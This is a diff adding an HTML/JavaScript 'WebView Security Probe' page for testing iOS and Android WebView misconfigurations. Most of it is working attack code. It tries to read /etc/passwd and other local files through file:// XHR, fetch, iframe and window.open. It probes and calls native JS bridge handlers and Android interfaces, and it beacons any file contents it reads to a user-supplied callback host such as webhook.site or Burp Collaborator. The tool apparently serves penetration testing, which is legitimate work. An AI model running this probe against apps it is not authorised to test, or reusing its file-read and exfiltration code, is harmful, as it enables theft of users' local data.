@@ -1,0 +1,1021 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WebView Security Probe</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=IBM+Plex+Sans:wght@400;500;600&display=swap');
+
+  :root {
+    --bg: #0a0e17;
+    --surface: #111827;
+    --surface-raised: #1a2234;
+    --border: #1e2d44;
+    --border-bright: #2a3f5f;
+    --text: #c9d1d9;
+    --text-dim: #6b7b8d;
+    --text-bright: #e6edf3;
+    --accent: #58a6ff;
+    --green: #3fb950;
+    --green-dim: rgba(63,185,80,0.12);
+    --red: #f85149;
+    --red-dim: rgba(248,81,73,0.12);
+    --yellow: #d29922;
+    --yellow-dim: rgba(210,153,34,0.12);
+    --orange: #db6d28;
+    --mono: 'JetBrains Mono', monospace;
+    --sans: 'IBM Plex Sans', sans-serif;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    font-size: 14px;
+    line-height: 1.6;
+    min-height: 100vh;
+    padding: 16px;
+  }
+
+  .header {
+    text-align: center;
+    padding: 24px 0 16px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 20px;
+  }
+
+  .header h1 {
+    font-family: var(--mono);
+    font-size: 20px;
+    font-weight: 700;
+    color: var(--text-bright);
+    letter-spacing: -0.5px;
+  }
+
+  .header .sub {
+    font-size: 12px;
+    color: var(--text-dim);
+    margin-top: 4px;
+    font-family: var(--mono);
+  }
+
+  /* Config Panel */
+  .config-panel {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 16px;
+    margin-bottom: 16px;
+  }
+
+  .config-panel label {
+    font-family: var(--mono);
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    display: block;
+    margin-bottom: 6px;
+  }
+
+  .config-panel input[type="text"] {
+    width: 100%;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 10px 12px;
+    color: var(--text-bright);
+    font-family: var(--mono);
+    font-size: 13px;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+
+  .config-panel input[type="text"]:focus {
+    border-color: var(--accent);
+  }
+
+  .config-panel .hint {
+    font-size: 11px;
+    color: var(--text-dim);
+    margin-top: 4px;
+    font-family: var(--mono);
+  }
+
+  .config-row {
+    margin-bottom: 12px;
+  }
+
+  .config-row:last-child { margin-bottom: 0; }
+
+  .handler-config {
+    display: flex;
+    gap: 8px;
+    align-items: flex-end;
+  }
+
+  .handler-config .field { flex: 1; }
+
+  .handler-config button {
+    height: 38px;
+    padding: 0 14px;
+    white-space: nowrap;
+  }
+
+  /* Buttons */
+  .btn {
+    font-family: var(--mono);
+    font-size: 12px;
+    font-weight: 600;
+    border: 1px solid var(--border-bright);
+    border-radius: 4px;
+    background: var(--surface-raised);
+    color: var(--text);
+    padding: 8px 16px;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+
+  .btn:hover { border-color: var(--accent); color: var(--text-bright); }
+
+  .btn-primary {
+    background: rgba(88,166,255,0.1);
+    border-color: var(--accent);
+    color: var(--accent);
+  }
+
+  .btn-run {
+    background: rgba(63,185,80,0.1);
+    border-color: var(--green);
+    color: var(--green);
+    width: 100%;
+    padding: 12px;
+    font-size: 13px;
+    margin-top: 16px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+
+  .btn-run:hover {
+    background: rgba(63,185,80,0.2);
+  }
+
+  /* Test Cards */
+  .test-grid {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    margin-bottom: 16px;
+  }
+
+  .test-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+  }
+
+  .test-card-header {
+    padding: 12px 16px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .severity {
+    font-family: var(--mono);
+    font-size: 10px;
+    font-weight: 700;
+    padding: 2px 6px;
+    border-radius: 3px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+
+  .severity-critical { background: var(--red-dim); color: var(--red); }
+  .severity-high { background: var(--orange); color: #fff; opacity: 0.9; }
+
+  .test-card-title {
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text-bright);
+  }
+
+  .test-card-body { padding: 12px 16px; }
+
+  .test-card-desc {
+    font-size: 12px;
+    color: var(--text-dim);
+    margin-bottom: 10px;
+    line-height: 1.5;
+  }
+
+  .test-status {
+    font-family: var(--mono);
+    font-size: 12px;
+    padding: 8px 12px;
+    border-radius: 4px;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    min-height: 36px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    word-break: break-all;
+  }
+
+  .status-idle { color: var(--text-dim); }
+  .status-running { color: var(--yellow); border-color: rgba(210,153,34,0.3); }
+  .status-vuln { color: var(--red); border-color: rgba(248,81,73,0.3); background: var(--red-dim); }
+  .status-safe { color: var(--green); border-color: rgba(63,185,80,0.3); background: var(--green-dim); }
+  .status-info { color: var(--accent); border-color: rgba(88,166,255,0.3); }
+
+  .dot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+  .dot-idle { background: var(--text-dim); }
+  .dot-running { background: var(--yellow); animation: pulse 1s infinite; }
+  .dot-vuln { background: var(--red); }
+  .dot-safe { background: var(--green); }
+  .dot-info { background: var(--accent); }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
+  }
+
+  /* Log */
+  .log-panel {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    margin-bottom: 16px;
+  }
+
+  .log-panel-header {
+    padding: 10px 16px;
+    border-bottom: 1px solid var(--border);
+    font-family: var(--mono);
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .log-body {
+    padding: 8px;
+    max-height: 250px;
+    overflow-y: auto;
+    font-family: var(--mono);
+    font-size: 11px;
+    line-height: 1.8;
+  }
+
+  .log-entry {
+    padding: 2px 8px;
+    border-radius: 3px;
+  }
+
+  .log-entry:nth-child(even) { background: rgba(255,255,255,0.015); }
+
+  .log-ts { color: var(--text-dim); }
+  .log-ok { color: var(--green); }
+  .log-fail { color: var(--red); }
+  .log-warn { color: var(--yellow); }
+  .log-info { color: var(--accent); }
+
+  /* Env info */
+  .env-bar {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 10px 16px;
+    margin-bottom: 16px;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-dim);
+    display: flex;
+    flex-wrap: wrap;
+    gap: 16px;
+  }
+
+  .env-bar span { color: var(--text); }
+
+  /* Guide section */
+  .guide {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 16px;
+    margin-bottom: 16px;
+  }
+
+  .guide h3 {
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--accent);
+    margin-bottom: 8px;
+  }
+
+  .guide p, .guide li {
+    font-size: 12px;
+    color: var(--text-dim);
+    line-height: 1.6;
+  }
+
+  .guide ol { padding-left: 20px; }
+  .guide li { margin-bottom: 4px; }
+  .guide code {
+    font-family: var(--mono);
+    font-size: 11px;
+    background: var(--bg);
+    padding: 1px 5px;
+    border-radius: 3px;
+    color: var(--text);
+  }
+
+  .handler-tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px;
+    margin-top: 8px;
+  }
+
+  .handler-tag {
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 3px 8px;
+    border-radius: 3px;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text);
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+
+  .handler-tag .remove {
+    cursor: pointer;
+    color: var(--text-dim);
+    font-size: 14px;
+    line-height: 1;
+  }
+
+  .handler-tag .remove:hover { color: var(--red); }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>&#x1f50d; WebView Security Probe</h1>
+  <div class="sub">iOS / Android WebView Misconfiguration Tester</div>
+</div>
+
+<!-- Environment Detection -->
+<div class="env-bar" id="envBar">
+  <div>Origin: <span id="envOrigin">—</span></div>
+  <div>Protocol: <span id="envProto">—</span></div>
+  <div>UA: <span id="envUA">—</span></div>
+  <div>WebKit MH: <span id="envWKMH">—</span></div>
+</div>
+
+<!-- Configuration -->
+<div class="config-panel">
+  <div class="config-row">
+    <label>Callback URL (receives results via GET params)</label>
+    <input type="text" id="callbackUrl" placeholder="https://YOUR-ID.webhook.site" />
+    <div class="hint">Use webhook.site, interactsh, or Burp Collaborator. Leave blank for local-only results.</div>
+  </div>
+  <div class="config-row">
+    <label>JS Bridge Handler Names (from static analysis)</label>
+    <div class="handler-config">
+      <div class="field">
+        <input type="text" id="handlerInput" placeholder="e.g. nativeCallHandler" />
+      </div>
+      <button class="btn btn-primary" onclick="addHandler()">+ Add</button>
+    </div>
+    <div class="hint">Add handler names found by iosassess or manual reversing.</div>
+    <div class="handler-tags" id="handlerTags"></div>
+  </div>
+  <div class="config-row">
+    <label>Local File Paths to Read (for file access tests)</label>
+    <div class="handler-config">
+      <div class="field">
+        <input type="text" id="filePathInput" placeholder="e.g. /etc/passwd" />
+      </div>
+      <button class="btn btn-primary" onclick="addFilePath()">+ Add</button>
+    </div>
+    <div class="hint">Default targets are pre-loaded. Add app-specific paths.</div>
+    <div class="handler-tags" id="filePathTags"></div>
+  </div>
+</div>
+
+<!-- Run Button -->
+<button class="btn btn-run" onclick="runAllTests()">&#x25b6; Run All Tests</button>
+
+<!-- Test Cards -->
+<div class="test-grid" style="margin-top: 16px;">
+
+  <!-- Test 1: Universal File Access -->
+  <div class="test-card">
+    <div class="test-card-header">
+      <span class="severity severity-critical">CRITICAL</span>
+      <span class="test-card-title">allowUniversalAccessFromFileURLs</span>
+    </div>
+    <div class="test-card-body">
+      <div class="test-card-desc">
+        Tests if XHR/fetch can read <code>file://</code> URIs from the current origin.
+        Exploitable when WebView loads local content. From HTTPS origin, this is expected to fail.
+      </div>
+      <div class="test-status status-idle" id="status-universal">
+        <div class="dot dot-idle"></div>
+        Waiting...
+      </div>
+    </div>
+  </div>
+
+  <!-- Test 2: File Access from File URLs -->
+  <div class="test-card">
+    <div class="test-card-header">
+      <span class="severity severity-high">HIGH</span>
+      <span class="test-card-title">allowFileAccessFromFileURLs</span>
+    </div>
+    <div class="test-card-body">
+      <div class="test-card-desc">
+        Tests if an iframe with <code>file://</code> src can be created and read.
+        Also tests via <code>XMLHttpRequest</code> to local paths.
+      </div>
+      <div class="test-status status-idle" id="status-fileaccess">
+        <div class="dot dot-idle"></div>
+        Waiting...
+      </div>
+    </div>
+  </div>
+
+  <!-- Test 3: WKScriptMessageHandler -->
+  <div class="test-card">
+    <div class="test-card-header">
+      <span class="severity severity-high">HIGH</span>
+      <span class="test-card-title">WKScriptMessageHandler (JS Bridge)</span>
+    </div>
+    <div class="test-card-body">
+      <div class="test-card-desc">
+        Probes <code>window.webkit.messageHandlers</code> for registered native bridge handlers.
+        Tests both common names and your custom-specified handlers.
+      </div>
+      <div class="test-status status-idle" id="status-jsbridge">
+        <div class="dot dot-idle"></div>
+        Waiting...
+      </div>
+    </div>
+  </div>
+
+  <!-- Test 4: Android JSInterface -->
+  <div class="test-card">
+    <div class="test-card-header">
+      <span class="severity severity-high">HIGH</span>
+      <span class="test-card-title">Android addJavascriptInterface</span>
+    </div>
+    <div class="test-card-body">
+      <div class="test-card-desc">
+        Probes for Android JS interface objects on <code>window</code>.
+        Checks common names like <code>Android</code>, <code>app</code>, <code>JSBridge</code>.
+      </div>
+      <div class="test-status status-idle" id="status-android-jsi">
+        <div class="dot dot-idle"></div>
+        Waiting...
+      </div>
+    </div>
+  </div>
+
+  <!-- Test 5: Navigation & Scheme Handling -->
+  <div class="test-card">
+    <div class="test-card-header">
+      <span class="severity severity-high">HIGH</span>
+      <span class="test-card-title">Scheme & Navigation Tests</span>
+    </div>
+    <div class="test-card-body">
+      <div class="test-card-desc">
+        Tests if the WebView allows navigation to dangerous schemes:
+        <code>file://</code>, <code>javascript:</code>, <code>data:</code>, custom app schemes.
+      </div>
+      <div class="test-status status-idle" id="status-schemes">
+        <div class="dot dot-idle"></div>
+        Waiting...
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- Event Log -->
+<div class="log-panel">
+  <div class="log-panel-header">
+    <span>Event Log</span>
+    <button class="btn" onclick="clearLog()" style="padding: 2px 8px; font-size: 10px;">Clear</button>
+  </div>
+  <div class="log-body" id="logBody">
+    <div class="log-entry"><span class="log-info">[*]</span> Ready. Configure callback URL and run tests.</div>
+  </div>
+</div>
+
+<!-- Interpretation Guide -->
+<div class="guide">
+  <h3>How to Interpret Results</h3>
+  <ol>
+    <li><strong style="color:var(--red)">VULNERABLE</strong> — The test succeeded, confirming the misconfiguration is exploitable from this context.</li>
+    <li><strong style="color:var(--green)">NOT EXPLOITABLE</strong> — The flag may be set, but the browser engine blocked exploitation from this origin.</li>
+    <li><strong style="color:var(--yellow)">INCONCLUSIVE</strong> — Network error or timeout; re-test or try a different approach.</li>
+    <li><strong style="color:var(--accent)">DETECTED</strong> — The handler/interface exists and is callable, even if the response is unknown.</li>
+  </ol>
+  <p style="margin-top:10px;">
+    <strong>Key nuance:</strong> <code>allowUniversalAccessFromFileURLs</code> and
+    <code>allowFileAccessFromFileURLs</code> are primarily exploitable when the WebView loads
+    content via <code>file://</code> scheme. If you're testing from an <code>https://</code>
+    page (like this one hosted on GitHub Pages), these tests will likely show NOT EXPLOITABLE
+    due to browser-engine-level SOP enforcement — this doesn't mean the flags aren't set,
+    just that the attack vector requires local file loading context.
+  </p>
+</div>
+
+<script>
+// ── State ──
+let customHandlers = [];
+let filePaths = ['/etc/passwd', '/etc/hosts', '/var/mobile/Library/Preferences/com.apple.mobilephone.plist'];
+const LOG = document.getElementById('logBody');
+
+// Default handler names to always probe
+const DEFAULT_HANDLERS = [
+  'callbackHandler', 'nativeHandler', 'jsbridge', 'appInterface',
+  'native', 'app', 'handler', 'messageHandler', 'bridge',
+  'cordova', 'ionic', 'capacitor', 'flutter', 'reactNative'
+];
+
+// Android JSInterface common names
+const ANDROID_INTERFACES = [
+  'Android', 'android', 'app', 'AppInterface', 'JSBridge',
+  'jsBridge', 'NativeBridge', 'native', 'WebAppInterface',
+  'JavaScriptInterface', '_cordovaNative', 'capacitor'
+];
+
+// ── Logging ──
+function log(msg, cls = 'log-info') {
+  const ts = new Date().toLocaleTimeString('en-GB');
+  const entry = document.createElement('div');
+  entry.className = 'log-entry';
+  const prefix = cls === 'log-ok' ? '[+]' : cls === 'log-fail' ? '[-]' : cls === 'log-warn' ? '[!]' : '[*]';
+  entry.innerHTML = `<span class="log-ts">${ts}</span> <span class="${cls}">${prefix}</span> ${escHtml(msg)}`;
+  LOG.appendChild(entry);
+  LOG.scrollTop = LOG.scrollHeight;
+}
+
+function clearLog() {
+  LOG.innerHTML = '';
+  log('Log cleared.');
+}
+
+function escHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+// ── UI Helpers ──
+function addHandler() {
+  const input = document.getElementById('handlerInput');
+  const val = input.value.trim();
+  if (!val) return;
+  if (customHandlers.includes(val)) return;
+  customHandlers.push(val);
+  input.value = '';
+  renderTags('handlerTags', customHandlers, removeHandler);
+}
+
+function removeHandler(name) {
+  customHandlers = customHandlers.filter(h => h !== name);
+  renderTags('handlerTags', customHandlers, removeHandler);
+}
+
+function addFilePath() {
+  const input = document.getElementById('filePathInput');
+  const val = input.value.trim();
+  if (!val) return;
+  if (filePaths.includes(val)) return;
+  filePaths.push(val);
+  input.value = '';
+  renderTags('filePathTags', filePaths, removeFilePath);
+}
+
+function removeFilePath(name) {
+  filePaths = filePaths.filter(f => f !== name);
+  renderTags('filePathTags', filePaths, removeFilePath);
+}
+
+function renderTags(containerId, arr, removeFn) {
+  const c = document.getElementById(containerId);
+  c.innerHTML = arr.map(item =>
+    `<div class="handler-tag">${escHtml(item)}<span class="remove" onclick="(${removeFn.name})('${escHtml(item)}')">&times;</span></div>`
+  ).join('');
+}
+
+function setStatus(id, state, msg) {
+  const el = document.getElementById(id);
+  el.className = `test-status status-${state}`;
+  const dotClass = state === 'running' ? 'dot-running' : state === 'vuln' ? 'dot-vuln' : state === 'safe' ? 'dot-safe' : state === 'info' ? 'dot-info' : 'dot-idle';
+  el.innerHTML = `<div class="dot ${dotClass}"></div>${escHtml(msg)}`;
+}
+
+// ── Callback ──
+function sendCallback(testName, result, detail) {
+  const url = document.getElementById('callbackUrl').value.trim();
+  if (!url) return;
+  try {
+    const params = new URLSearchParams({
+      test: testName,
+      result: result,
+      detail: (detail || '').substring(0, 500),
+      origin: location.origin || location.href,
+      ts: new Date().toISOString()
+    });
+    // Use Image beacon — works cross-origin, no CORS issues
+    const img = new Image();
+    img.src = url + (url.includes('?') ? '&' : '?') + params.toString();
+    log(`Callback sent for ${testName}: ${result}`, 'log-info');
+  } catch(e) {
+    log(`Callback failed: ${e.message}`, 'log-warn');
+  }
+}
+
+// ── Environment Detection ──
+function detectEnv() {
+  document.getElementById('envOrigin').textContent = location.origin || location.href;
+  document.getElementById('envProto').textContent = location.protocol;
+  document.getElementById('envUA').textContent = navigator.userAgent.substring(0, 80) + '...';
+
+  let wkmh = 'Not present';
+  try {
+    if (window.webkit && window.webkit.messageHandlers) {
+      wkmh = 'Present (object exists)';
+    }
+  } catch(e) { /* */ }
+  document.getElementById('envWKMH').textContent = wkmh;
+}
+
+// ── Test 1: Universal File Access ──
+async function testUniversalAccess() {
+  setStatus('status-universal', 'running', 'Testing XHR to file:// URIs...');
+  log('Testing allowUniversalAccessFromFileURLs...');
+
+  let anySuccess = false;
+
+  for (const path of filePaths) {
+    try {
+      const result = await new Promise((resolve, reject) => {
+        const xhr = new XMLHttpRequest();
+        xhr.timeout = 3000;
+        xhr.onload = function() {
+          if (xhr.status === 0 || xhr.status === 200) {
+            resolve(xhr.responseText);
+          } else {
+            reject(new Error('status ' + xhr.status));
+          }
+        };
+        xhr.onerror = () => reject(new Error('blocked'));
+        xhr.ontimeout = () => reject(new Error('timeout'));
+        xhr.open('GET', 'file://' + path, true);
+        xhr.send();
+      });
+
+      anySuccess = true;
+      const preview = result.substring(0, 100);
+      log(`XHR file://${path} — SUCCESS: ${preview}`, 'log-fail');
+      sendCallback('universalFileAccess', 'VULNERABLE', `Read ${path}: ${preview}`);
+    } catch(e) {
+      log(`XHR file://${path} — Blocked: ${e.message}`, 'log-ok');
+    }
+  }
+
+  // Also try fetch API
+  try {
+    const resp = await fetch('file:///etc/passwd');
+    const text = await resp.text();
+    anySuccess = true;
+    log(`fetch file:///etc/passwd — SUCCESS`, 'log-fail');
+    sendCallback('universalFileAccess_fetch', 'VULNERABLE', text.substring(0, 100));
+  } catch(e) {
+    log(`fetch file:///etc/passwd — Blocked: ${e.message}`, 'log-ok');
+  }
+
+  if (anySuccess) {
+    setStatus('status-universal', 'vuln', 'VULNERABLE — File read succeeded from current origin!');
+  } else {
+    setStatus('status-universal', 'safe', 'Not exploitable from this origin (expected for HTTPS)');
+    sendCallback('universalFileAccess', 'NOT_EXPLOITABLE', 'Blocked from ' + location.protocol);
+  }
+}
+
+// ── Test 2: File Access from File URLs ──
+async function testFileAccess() {
+  setStatus('status-fileaccess', 'running', 'Testing file:// iframe and XHR...');
+  log('Testing allowFileAccessFromFileURLs...');
+
+  let vulnFound = false;
+
+  // Method 1: iframe src=file://
+  try {
+    const result = await new Promise((resolve, reject) => {
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = 'file:///etc/passwd';
+
+      const timeout = setTimeout(() => {
+        cleanup();
+        reject(new Error('timeout'));
+      }, 3000);
+
+      iframe.onload = function() {
+        try {
+          const content = iframe.contentDocument || iframe.contentWindow.document;
+          const text = content.body ? content.body.innerText : content.documentElement.textContent;
+          clearTimeout(timeout);
+          cleanup();
+          resolve(text);
+        } catch(e) {
+          clearTimeout(timeout);
+          cleanup();
+          reject(e);
+        }
+      };
+
+      iframe.onerror = function() {
+        clearTimeout(timeout);
+        cleanup();
+        reject(new Error('iframe load error'));
+      };
+
+      function cleanup() { try { document.body.removeChild(iframe); } catch(e){} }
+      document.body.appendChild(iframe);
+    });
+
+    vulnFound = true;
+    log(`iframe file:// — SUCCESS: ${result.substring(0, 80)}`, 'log-fail');
+    sendCallback('fileAccessFromFile', 'VULNERABLE', 'iframe read: ' + result.substring(0, 100));
+  } catch(e) {
+    log(`iframe file:// — Blocked: ${e.message}`, 'log-ok');
+  }
+
+  // Method 2: window.open file://
+  try {
+    const w = window.open('file:///etc/passwd', '_blank');
+    if (w) {
+      await new Promise(r => setTimeout(r, 1000));
+      try {
+        const text = w.document.body.innerText;
+        if (text && text.length > 0) {
+          vulnFound = true;
+          log(`window.open file:// — SUCCESS: ${text.substring(0, 80)}`, 'log-fail');
+          sendCallback('fileAccessFromFile_winopen', 'VULNERABLE', text.substring(0, 100));
+        }
+      } catch(e) {
+        log(`window.open file:// — Cross-origin blocked`, 'log-ok');
+      }
+      try { w.close(); } catch(e) {}
+    }
+  } catch(e) {
+    log(`window.open file:// — Blocked: ${e.message}`, 'log-ok');
+  }
+
+  if (vulnFound) {
+    setStatus('status-fileaccess', 'vuln', 'VULNERABLE — Local file read confirmed!');
+  } else {
+    setStatus('status-fileaccess', 'safe', 'Not exploitable from this origin');
+    sendCallback('fileAccessFromFile', 'NOT_EXPLOITABLE', 'Blocked from ' + location.protocol);
+  }
+}
+
+// ── Test 3: WKScriptMessageHandler ──
+function testJSBridge() {
+  setStatus('status-jsbridge', 'running', 'Probing webkit.messageHandlers...');
+  log('Testing WKScriptMessageHandler bridge...');
+
+  const allHandlers = [...DEFAULT_HANDLERS, ...customHandlers];
+  const found = [];
+  const callable = [];
+
+  // Check if the webkit object exists at all
+  if (typeof window.webkit === 'undefined' || !window.webkit) {
+    log('window.webkit is undefined — not a WKWebView or bridge not exposed', 'log-info');
+    setStatus('status-jsbridge', 'safe', 'window.webkit not present — not a WKWebView context');
+    sendCallback('jsBridge', 'NOT_PRESENT', 'window.webkit undefined');
+    return;
+  }
+
+  if (!window.webkit.messageHandlers) {
+    log('window.webkit exists but messageHandlers is undefined', 'log-info');
+    setStatus('status-jsbridge', 'info', 'window.webkit exists but no messageHandlers');
+    sendCallback('jsBridge', 'PARTIAL', 'webkit exists, no messageHandlers');
+    return;
+  }
+
+  log('window.webkit.messageHandlers EXISTS — probing handlers...', 'log-warn');
+
+  for (const name of allHandlers) {
+    try {
+      const handler = window.webkit.messageHandlers[name];
+      if (handler) {
+        found.push(name);
+        log(`Handler "${name}" — EXISTS`, 'log-warn');
+
+        // Try to call it
+        try {
+          handler.postMessage({probe: true, from: 'webview-sec-test', ts: Date.now()});
+          callable.push(name);
+          log(`Handler "${name}" — postMessage SENT (no error thrown)`, 'log-fail');
+        } catch(callErr) {
+          log(`Handler "${name}" — postMessage failed: ${callErr.message}`, 'log-info');
+        }
+      }
+    } catch(e) {
+      // Handler doesn't exist, which is normal
+    }
+  }
+
+  if (callable.length > 0) {
+    setStatus('status-jsbridge', 'vuln', `CALLABLE: ${callable.join(', ')}`);
+    sendCallback('jsBridge', 'VULNERABLE', 'Callable handlers: ' + callable.join(', '));
+  } else if (found.length > 0) {
+    setStatus('status-jsbridge', 'info', `DETECTED (not callable): ${found.join(', ')}`);
+    sendCallback('jsBridge', 'DETECTED', 'Found handlers: ' + found.join(', '));
+  } else {
+    setStatus('status-jsbridge', 'safe', `No handlers found among ${allHandlers.length} probed names`);
+    sendCallback('jsBridge', 'NONE_FOUND', `Probed ${allHandlers.length} names`);
+  }
+}
+
+// ── Test 4: Android JSInterface ──
+function testAndroidJSI() {
+  setStatus('status-android-jsi', 'running', 'Probing Android JS interfaces...');
+  log('Testing Android addJavascriptInterface...');
+
+  const found = [];
+  const methods = [];
+
+  for (const name of ANDROID_INTERFACES) {
+    try {
+      if (window[name] && typeof window[name] === 'object' && window[name] !== window) {
+        found.push(name);
+        log(`Android interface "${name}" — EXISTS`, 'log-warn');
+
+        // Try to enumerate methods
+        try {
+          const props = Object.getOwnPropertyNames(Object.getPrototypeOf(window[name]) || window[name]);
+          const m = props.filter(p => typeof window[name][p] === 'function');
+          if (m.length > 0) {
+            methods.push(`${name}: [${m.join(', ')}]`);
+            log(`  Methods: ${m.join(', ')}`, 'log-fail');
+          }
+        } catch(e) {
+          // getClass check (pre-API-17 vulnerability)
+          try {
+            if (window[name].getClass) {
+              log(`  getClass() AVAILABLE — pre-API-17 RCE possible!`, 'log-fail');
+              methods.push(`${name}: getClass() AVAILABLE`);
+            }
+          } catch(e2) {}
+        }
+      }
+    } catch(e) {}
+  }
+
+  if (found.length > 0) {
+    setStatus('status-android-jsi', 'vuln', `FOUND: ${found.join(', ')}`);
+    sendCallback('androidJSI', 'VULNERABLE', `Interfaces: ${found.join(', ')}. ${methods.join('; ')}`);
+  } else {
+    setStatus('status-android-jsi', 'safe', 'No Android JS interfaces detected');
+    sendCallback('androidJSI', 'NOT_PRESENT', 'No interfaces found');
+  }
+}
+
+// ── Test 5: Scheme & Navigation ──
+function testSchemes() {
+  setStatus('status-schemes', 'running', 'Testing scheme handlers...');
+  log('Testing navigation scheme handling...');
+
+  const results = [];
+
+  // Test data: URI
+  try {
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = 'data:text/html,<h1>data-uri-test</h1>';
+    document.body.appendChild(iframe);
+    setTimeout(() => {
+      try {
+        const text = iframe.contentDocument.body.innerText;
+        if (text.includes('data-uri-test')) {
+          results.push('data: (rendered)');
+          log('data: URI — Rendered in iframe', 'log-warn');
+        }
+      } catch(e) {
+        log('data: URI — Blocked by SOP in iframe', 'log-ok');
+      }
+      try { document.body.removeChild(iframe); } catch(e){}
+    }, 1000);
+  } catch(e) {
+    log('data: URI iframe — Error: ' + e.message, 'log-ok');
+  }
+
+  // Test javascript: URI (via iframe and anchor)
+  try {
+    const a = document.createElement('a');
+    a.href = 'javascript:void(0)';
+    // If we can create javascript: links, note it
+    if (a.protocol === 'javascript:') {
+      results.push('javascript: (link created)');
+      log('javascript: URI — Link creation allowed (CSP may still block)', 'log-warn');
+    }
+  } catch(e) {
+    log('javascript: URI — Blocked', 'log-ok');
+  }
+
+  // Test blob: URI
+  try {
+    const blob = new Blob(['<h1>blob-test</h1>'], {type: 'text/html'});
+    const blobUrl = URL.createObjectURL(blob);
+    if (blobUrl) {
+      results.push('blob: (created)');
+      log('blob: URI — Creation allowed', 'log-warn');
+      URL.revokeObjectURL(blobUrl);
+    }
+  } catch(e) {
+    log('blob: URI — Blocked', 'log-ok');
+  }
+
+  // Detect custom URL schemes by checking common app schemes
+  const appSchemes = ['tel:', 'sms:', 'mailto:', 'itms-apps:', 'itms-appss:', 'fb:', 'twitter:', 'whatsapp:'];
+  for (const scheme of appSchemes) {
+    try {
+      const a = document.createElement('a');
+      a.href = scheme + 'test';
+      if (a.href.startsWith(scheme)) {
+        results.push(scheme.replace(':', ''));
+      }
+    } catch(e) {}
+  }
+
+  setTimeout(() => {
+    if (results.length > 0) {
+      setStatus('status-schemes', 'info', `Allowed: ${results.join(', ')}`);
+      sendCallback('schemes', 'DETECTED', results.join(', '));
+    } else {
+      setStatus('status-schemes', 'safe', 'No dangerous scheme handlers detected');
+      sendCallback('schemes', 'NONE', 'All schemes blocked');
+    }
+  }, 1500);
+}
+
+// ── Run All ──
+async function runAllTests() {
+  log('═══ Starting full test suite ═══', 'log-warn');
+  log(`Callback: ${document.getElementById('callbackUrl').value || '(none)'}`, 'log-info');
+  log(`Custom handlers: ${customHandlers.join(', ') || '(none)'}`, 'log-info');
+  log(`Target files: ${filePaths.join(', ')}`, 'log-info');
+
+  // Send a beacon first so we know the page loaded
+  sendCallback('probe_loaded', 'STARTED', `Origin: ${location.origin}, Proto: ${location.protocol}`);
+
+  // Run tests with slight delays so UI updates
+  await testUniversalAccess();
+  await new Promise(r => setTimeout(r, 300));
+  await testFileAccess();
+  await new Promise(r => setTimeout(r, 300));
+  testJSBridge();
+  await new Promise(r => setTimeout(r, 300));
+  testAndroidJSI();
+  await new Promise(r => setTimeout(r, 300));
+  testSchemes();
+
+  await new Promise(r => setTimeout(r, 2000));
+  log('═══ Test suite complete ═══', 'log-warn');
+  sendCallback('probe_complete', 'DONE', 'All tests finished');
+}
+
+// ── Init ──
+detectEnv();
+renderTags('filePathTags', filePaths, removeFilePath);
+</script>
+
+</body>
+</html>
